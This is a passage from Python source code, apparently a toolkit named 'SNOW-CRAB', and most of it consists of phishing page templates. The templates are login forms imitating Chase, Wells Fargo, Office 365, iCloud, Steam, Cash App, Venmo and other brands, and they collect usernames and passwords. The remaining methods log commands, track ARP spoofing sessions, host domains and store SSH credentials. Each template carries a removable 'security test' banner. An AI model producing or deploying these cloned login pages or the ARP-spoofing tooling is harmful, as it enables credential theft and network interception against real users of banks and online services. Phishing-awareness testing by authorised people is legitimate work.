button{width:100%;padding:12px;background:#ff0000;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Adobe</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_steam(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Steam</title>
<style>
body{background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#171a21;border-radius:8px;padding:40px;width:400px}
.logo{color:#67c1f5;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2a3f5a;border:1px solid #4a6a8a;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#67c1f5}
button{width:100%;padding:12px;background:#67c1f5;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Steam</div>
<form method="POST"><input type="text" name="username" placeholder="Steam account name" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_roblox(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Roblox</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#e32c2c;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#e32c2c}
button{width:100%;padding:12px;background:#e32c2c;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Roblox</div>
<form method="POST"><input type="text" name="username" placeholder="Username/Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_twitch(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Twitch</title>
<style>
body{background:#0e0e10;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#18181b;border-radius:8px;padding:40px;width:400px}
.logo{color:#9146ff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#1f1f23;border:1px solid #2f2f35;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#9146ff}
button{width:100%;padding:12px;background:#9146ff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Twitch</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_xbox(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Xbox</title>
<style>
body{background:#107c10;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#107c10;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#107c10}
button{width:100%;padding:12px;background:#107c10;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Xbox</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_playstation(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>PlayStation</title>
<style>
body{background:#003791;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#003791;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#003791}
button{width:100%;padding:12px;background:#003791;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">PlayStation</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_cashapp(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Cash App</title>
<style>
body{background:#00d632;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#00d632;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#00d632}
button{width:100%;padding:12px;background:#00d632;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Cash App</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_venmo(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Venmo</title>
<style>
body{background:#008cff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#008cff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#008cff}
button{width:100%;padding:12px;background:#008cff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Venmo</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_chase(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Chase</title>
<style>
body{background:#1174c2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#1174c2;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#1174c2}
button{width:100%;padding:12px;background:#1174c2;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Chase</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_wellsfargo(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Wells Fargo</title>
<style>
body{background:#bc1f2c;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#bc1f2c;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#bc1f2c}
button{width:100%;padding:12px;background:#bc1f2c;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Wells Fargo</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_office365(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Office 365</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:4px;padding:44px;width:440px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0078d4;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Office 365</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_onedrive(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>OneDrive</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:4px;padding:44px;width:440px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0078d4;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">OneDrive</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_icloud(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>iCloud</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:12px;padding:40px;width:420px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0071e3;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d6d6d6;border-radius:8px;box-sizing:border-box}
input:focus{outline:none;border-color:#0071e3}
button{width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">iCloud</div>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_pinterest(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Pinterest</title>
<style>
body{background:#e60023;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#e60023;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#e60023}
button{width:100%;padding:12px;background:#e60023;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Pinterest</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_reddit(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Reddit</title>
<style>
body{background:#ff4500;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#ff4500;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#ff4500}
button{width:100%;padding:12px;background:#ff4500;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Reddit</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_snapchat(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Snapchat</title>
<style>
body{background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#fffc00;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold;text-shadow:0 0 2px #000}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#fffc00}
button{width:100%;padding:12px;background:#fffc00;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Snapchat</div>
<form method="POST"><input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_tiktok(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>TikTok</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#111;border-radius:8px;padding:40px;width:400px}
.logo{color:#fe2c55;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#222;border:1px solid #333;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#fe2c55}
button{width:100%;padding:12px;background:#fe2c55;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">TikTok</div>
<form method="POST"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_tinder(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Tinder</title>
<style>
body{background:#fd5068;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#fd5068;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#fd5068}
button{width:100%;padding:12px;background:#fd5068;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Tinder</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_bumble(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Bumble</title>
<style>
body{background:#ff6b6b;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#ff6b6b;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#ff6b6b}
button{width:100%;padding:12px;background:#ff6b6b;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Bumble</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _template_custom(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:'Courier New',monospace;background:linear-gradient(135deg,#0a0e1a,#16213e,#0f3460);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1a1a2e;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
input:focus{outline:none;border-color:#0f3460}
button{width:100%;padding:14px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo"><h1>SNOW-CRAB Secure Portal</h1></div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''

    # ==================== Database Methods ====================
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log a threat"""
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        """Add an IP to managed list"""
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block an IP"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock an IP"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove an IP from managed list"""
        try:
            self.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
                    hostname: str = None) -> bool:
        """Add MAC address information"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO mac_info 
                   (mac_address, vendor, ip_address, hostname, last_seen)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (mac_address, vendor, ip_address, hostname)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add MAC info: {e}")
            return False
    
    def get_mac_info(self, mac_address: str) -> Optional[Dict]:
        """Get MAC address information"""
        try:
            row = self.conn.execute(
                "SELECT * FROM mac_info WHERE mac_address = ?", (mac_address,)
            ).fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get MAC info: {e}")
            return None
    
    def get_all_mac_info(self, limit: int = 100) -> List[Dict]:
        """Get all MAC address information"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM mac_info ORDER BY last_seen DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get all MAC info: {e}")
            return []
    
    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
        """Add an ARP spoof entry"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO arp_spoofing 
                   (target_ip, gateway_ip, interface, started_at, status)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
                (target_ip, gateway_ip, interface)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add ARP spoof: {e}")
            return False
    
    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
                         duration: float, ended_at: str) -> bool:
        """Update ARP spoof entry"""
        try:
            self.conn.execute(
                """UPDATE arp_spoofing 
                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
                   WHERE target_ip = ? AND gateway_ip = ?""",
                (packets_sent, duration, ended_at, target_ip, gateway_ip)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to update ARP spoof: {e}")
            return False
    
    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
        """Get ARP spoof entries"""
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
                    (status,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get ARP spoofs: {e}")
            return []
    
    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
                    country: str, isp: str, nat_type: str) -> bool:
        """Add NAT information"""
        try:
            self.conn.execute(
                """INSERT INTO nat_info 
                   (public_ip, private_ip, router_ip, country, isp, nat_type)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (public_ip, private_ip, router_ip, country, isp, nat_type)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add NAT info: {e}")
            return False
    
    def get_nat_info(self, limit: int = 1) -> List[Dict]:
        """Get NAT information"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM nat_info ORDER BY timestamp DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get NAT info: {e}")
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        """Add a domain host"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        """Get domain hosts"""
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get domain hosts: {e}")
            return []
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        """Resolve domain to IP"""
        try:
            # Check domain_hosting table
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            # Check dns_cache table
            row = self.conn.execute(
                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            # Resolve and cache
            ip = socket.gethostbyname(domain)
            if ip:
                self.conn.execute(
                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
                    (domain, ip)
                )
                self.conn.commit()
                return ip
            return None
        except Exception as e:
            logger.error(f"Failed to resolve domain: {e}")
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        """Resolve IP to domain"""
        try:
            # Check domain_hosting table
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            
            # Try reverse DNS
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"Failed to resolve IP: {e}")
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        """Add an SSH connection"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get SSH connections: {e}")
            return []
    
    def update_ssh_status(self, conn_id: str, status: str) -> bool:
        """Update SSH connection status"""
        try:
            self.conn.execute(
                "UPDATE ssh_connections SET status = ?, last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (status, conn_id)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to update SSH status: {e}")
            return False
    
    def delete_ssh_connection(self, conn_id: str) -> bool:
        """Delete an SSH connection"""
        try:
            self.conn.execute("DELETE FROM ssh_connections WHERE id = ?", (conn_id,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to delete SSH connection: {e}")
            return False
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        """Log an SSH command"""
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
